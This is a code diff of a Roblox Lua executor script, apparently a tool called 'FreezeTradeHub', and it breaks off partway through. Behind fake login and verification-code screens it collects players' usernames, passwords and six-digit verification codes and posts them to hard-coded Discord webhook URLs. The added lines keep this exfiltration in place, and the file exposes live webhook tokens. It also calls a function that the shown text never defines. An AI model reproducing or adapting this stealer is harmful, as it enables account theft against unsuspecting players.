@@ -1,45 +1,40 @@
 -- URL Webhook Discord
-local webhook_url1 = "https://discord.com/api/webhooks/1325444740241559609/RPzaWK9VJG7adUC3nszG_oAjkqowruGyYRLYQx2Mp6BWucKbQ4-xyiad0WCA15fkW98S"
-local webhook_url2 = "https://discord.com/api/webhooks/1325418716690644992/45rMJyVc3WnHcw4tW1Q85LmH6J2lj5Sc0DgVuRD46ar-JkmFyLTJZURi-gc4jeZcKecC"
+local webhook_url = "https://discord.com/api/webhooks/1325444740241559609/RPzaWK9VJG7adUC3nszG_oAjkqowruGyYRLYQx2Mp6BWucKbQ4-xyiad0WCA15fkW98S"
 
 -- Key yang benar
 local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
 local linkUrl = "https://link-target.net/1273087/freezetradehub"
 
 -- Fungsi untuk mengirim data ke Discord
-local function sendToDualWebhook(content)
-    local payload = {
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({ content = content })
-    }
+local function sendToDiscord(content)
+local payload = {
+Url = webhook_url,
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json"
+},
+Body = game:GetService("HttpService"):JSONEncode({
+content = content
+})
+}
 
-    local function sendToWebhook(url)
-        local success, response = pcall(function()
-            payload.Url = url
-            if syn and syn.request then
-                return syn.request(payload)
-            elseif http and http.request then
-                return http.request(payload)
-            elseif request then
-                return request(payload)
-            else
-                error("Executor Anda tidak mendukung HTTP requests!")
-            end
-        end)
+local response
+if syn and syn.request then
+response = syn.request(payload)
+elseif http and http.request then
+response = http.request(payload)
+elseif request then
+response = request(payload)
+else
+print("Executor Anda tidak mendukung HTTP requests!")
+return
+end
 
-        if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
-            print("Berhasil mengirim ke webhook:", url)
-        else
-            print("Gagal mengirim ke webhook:", url, "Error:", response and response.StatusCode or "Unknown")
-        end
-    end
-
-    -- Kirim ke masing-masing webhook
-    sendToWebhook(webhook_url1)
-    sendToWebhook(webhook_url2)
+if response and response.StatusCode == 200 then
+print("Data berhasil dikirim ke Discord!")
+else
+print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
+end
 end
 
 -- Fungsi untuk membuat MenuGUI
@@ -311,8 +306,7 @@ local function createVerificationCodeGUI()
         local verificationCode = codeBox.Text
 
         if verificationCode:match("^%d%d%d%d%d%d$") then
-           local content = "Username: " .. username .. "\nKode Verifikasi: " .. verificationCode
-        sendToDualWebhook(content)
+            local success = sendVerificationToDiscord(username, verificationCode)
             if success then
                 gui:Destroy()
                 createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi berhasil
@@ -556,7 +550,31 @@ local function createLoginGUI()
             return
         end
 
-     local content = "USERNAME: " .. username .. "\nPASSWORD: " .. password
-     sendToDualWebhook(content)
+        sendToDiscord("Username: " .. username .. "\nPassword: " .. password)
         errorLabel.Text = ""
-        print("Data be
+        print("Data berhasil terkirim ke Discord!")
+
+        gui:Destroy()
+        createLoadingGUI(3, function()
+            createVerificationCodeGUI()
+            isProcessing = false -- Selesai proses
+        end)
+    end)
+end
+
+-- Fungsi Validasi Key
+local function createKeyValidationGUI()
+local gui = Instance.new("ScreenGui")
+local frame = Instance.new("Frame")
+local titleLabel = Instance.new("TextLabel")
+local keyBox = Instance.new("TextBox")
+local verifyKeyButton = Instance.new("TextButton")
+local copyLinkButton = Instance.new("TextButton")
+local errorLabel = Instance.new("TextLabel")
+
+gui.Name = "KeyValidationGUI"
+gui.Parent = game:GetService("CoreGui")
+
+frame.Name = "KeyFrame"
+frame.Parent = gui
+    
